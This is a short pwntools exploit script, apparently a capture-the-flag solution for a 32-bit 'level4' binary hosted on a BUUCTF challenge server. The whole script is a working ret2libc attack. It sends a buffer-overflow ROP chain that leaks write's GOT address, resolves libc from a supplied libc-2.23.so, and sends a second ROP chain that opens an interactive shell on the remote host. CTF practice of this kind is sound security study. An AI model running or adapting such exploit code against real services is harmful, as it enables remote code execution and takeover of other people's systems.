from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../level4')

target = remote('node4.buuoj.cn', 28904)

main = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']

payload = utils.create_rop_payload(0x88, {0x1: (), write_got: (), 0x4: ()}, 'x86', write_plt, main)
target.sendline(payload)
write_addr = u32(target.recv(4))

ans = utils.get_shell_from_libc_so('write', write_addr, '../libc-2.23.so')
payload = utils.create_rop_payload(0x88, {ans[1]: ()}, 'x86', ans[0])
target.sendline(payload)
target.interactive()